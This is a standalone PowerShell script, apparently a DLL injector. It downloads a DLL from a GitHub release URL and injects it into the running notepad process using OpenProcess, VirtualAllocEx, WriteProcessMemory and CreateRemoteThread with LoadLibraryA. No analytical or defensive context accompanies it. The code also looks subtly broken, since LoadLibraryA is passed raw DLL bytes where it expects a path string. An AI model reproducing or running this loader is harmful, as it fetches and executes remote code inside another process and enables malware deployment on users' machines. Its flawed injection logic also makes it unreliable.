$dllUrl = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1.dll"
$targetProcess = "notepad"

$webClient = New-Object System.Net.WebClient
$dllBytes = $webClient.DownloadData($dllUrl)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
}
"@

$process = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
if ($process) {
    $PROCESS_ALL_ACCESS = 0x1F0FFF
    $hProcess = [Injector]::OpenProcess($PROCESS_ALL_ACCESS, $false, $process.Id)
    
    if ($hProcess -ne 0) {
        $MEM_COMMIT = 0x1000
        $MEM_RESERVE = 0x2000
        $PAGE_READWRITE = 0x04
        
        $remoteBuffer = [Injector]::VirtualAllocEx($hProcess, 0, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
        
        if ($remoteBuffer -ne 0) {
            $bytesWritten = [UIntPtr]::Zero
            [Injector]::WriteProcessMemory($hProcess, $remoteBuffer, $dllBytes, $dllBytes.Length, [ref] $bytesWritten)
            
            $kernel32 = [Injector]::GetProcAddress([Injector]::LoadLibrary("kernel32.dll"), "LoadLibraryA")
            $threadHandle = [Injector]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $remoteBuffer, 0, 0)
            
            if ($threadHandle -ne 0) {
                [Injector]::CloseHandle($threadHandle)
            }
        }
        [Injector]::CloseHandle($hProcess)
    }
}